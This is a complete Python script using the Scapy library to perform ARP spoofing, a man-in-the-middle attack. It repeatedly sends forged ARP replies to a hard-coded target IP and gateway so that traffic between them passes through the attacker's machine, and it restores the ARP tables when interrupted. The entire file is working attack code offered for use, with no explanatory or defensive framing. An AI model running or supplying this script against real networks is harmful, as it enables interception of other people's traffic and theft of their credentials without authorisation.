#!/usr/bin/env python

import time
import scapy.all as sc


def get_mac(ip):
	arp_request = sc.ARP(pdst=ip)
	broadcast = sc.Ether(dst="ff:ff:ff:ff:ff:ff")
	arp_request_broadcast = broadcast/arp_request
	answerd_list = sc.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
	
	return answerd_list[0][1].hwsrc
	

def spoof(targer_ip, spoof_ip):
    target_mac = get_mac(targer_ip)
    packet = sc.ARP(op=2, pdst=targer_ip, hwdst=target_mac, psrc=spoof_ip)
    sc.send(packet, verbose=False)
    


def restore(destination_ip, sourse_ip):
    destination_mac = get_mac(destination_ip)
    sourse_mac = get_mac(sourse_ip)
    packet = sc.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=sourse_ip, hwsrc=sourse_mac)
    sc.send(packet, count=4, verbose=False)


target_ip='10.8.5.86'
gateway_ip = '10.8.4.1'

send_packets_count = 0
try:
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        send_packets_count+=2
        print("\r[+] Packet sent: " + str(send_packets_count), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] Detected CTRL + C ..... Reseting ARP tables...... Please wait.")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)













